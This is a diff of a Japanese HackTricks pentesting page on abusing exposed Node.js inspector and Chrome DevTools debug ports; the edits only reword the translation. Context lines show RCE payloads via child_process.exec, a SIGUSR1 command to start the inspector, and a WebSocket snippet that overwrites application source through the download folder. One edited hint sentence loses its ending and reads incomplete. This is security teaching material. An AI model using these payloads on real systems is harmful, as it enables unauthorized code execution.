@@ -49,15 +49,15 @@ DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4
 ```
 ### ブラウザ、WebSocket、および同一生成元ポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**初期HTTP接続**は、**ユニークなデバッガセッションIDを取得するため**に必要です。**同一生成元ポリシー**は、ウェブサイトが**このHTTP接続**を行うことを**防ぎます**。 [**DNSリバインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)**に対する追加のセキュリティ**として、Node.jsは接続の**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを確認します。
+ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**ユニークなデバッガセッションIDを取得するためには、初期HTTP接続が必要です**。**同一生成元ポリシー**は、ウェブサイトが**このHTTP接続**を行うことを**防ぎます**。 [**DNSリバインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)に対する追加のセキュリティとして、Node.jsは接続の**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを確認します。
 
 {% hint style="info" %}
-この**セキュリティ対策は、インスペクタを悪用してコードを実行することを防ぎます**。**HTTPリクエストを送信するだけで**（これはSSRF脆弱性を悪用して行うことができる）、実行されることはありません。
+この**セキュリティ対策は、インスペクタを悪用してコードを実行することを防ぎます**。**単にHTTPリクエストを送信することで**（これはSSRF脆弱性を悪用して行うことができる）。
 {% endhint %}
 
 ### 実行中のプロセスでインスペクタを起動する
 
-実行中のnodejsプロセスに**SIGUSR1信号**を送信すると、**デフォルトポートでインスペクタを起動**させることができます。ただし、十分な権限が必要であるため、これにより**プロセス内の情報への特権アクセスが付与される可能性があります**が、直接的な特権昇格にはなりません。
+実行中のnodejsプロセスに**SIGUSR1信号**を送信することで、**デフォルトポートでインスペクタを起動させる**ことができます。ただし、十分な権限が必要であるため、これにより**プロセス内の情報への特権アクセスが得られる可能性がありますが、直接的な特権昇格はありません**。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -68,7 +68,7 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ### インスペクタ/デバッガに接続する
 
-**Chromiumベースのブラウザ**に接続するには、ChromeまたはEdgeのそれぞれに対して`chrome://inspect`または`edge://inspect`のURLにアクセスできます。Configureボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：
+**Chromiumベースのブラウザ**に接続するには、ChromeまたはEdge用の`chrome://inspect`または`edge://inspect`のURLにアクセスできます。Configureボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：
 
 ![](<../../.gitbook/assets/image (674).png>)
 
@@ -98,7 +98,7 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 もしあなたがここに、[**Electron の XSS から RCE を取得する方法を探しているなら、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
 {% endhint %}
 
-Node **インスペクター** に接続できるときに **RCE** を取得する一般的な方法のいくつかは、（これは **Chrome DevTools プロトコルへの接続では機能しないようです**）を使用することです：
+Node **インスペクター** に接続できるときに **RCE** を取得する一般的な方法のいくつかは、（この **Chrome DevTools プロトコルへの接続では機能しないようです**）を使用することです：
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -124,7 +124,7 @@ calc.exeを実行します。
 
 ### ファイルの上書き
 
-**ダウンロードしたファイルが保存されるフォルダ**を変更し、**悪意のあるコード**でアプリケーションの**ソースコード**を**上書き**するファイルをダウンロードします。
+**ダウンロードしたファイルが保存されるフォルダー**を変更し、アプリケーションの**ソースコード**を**悪意のあるコード**で**上書き**するためにファイルをダウンロードします。
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
@@ -162,8 +162,8 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 * [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
 
 {% hint style="success" %}
-AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -171,7 +171,7 @@ GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
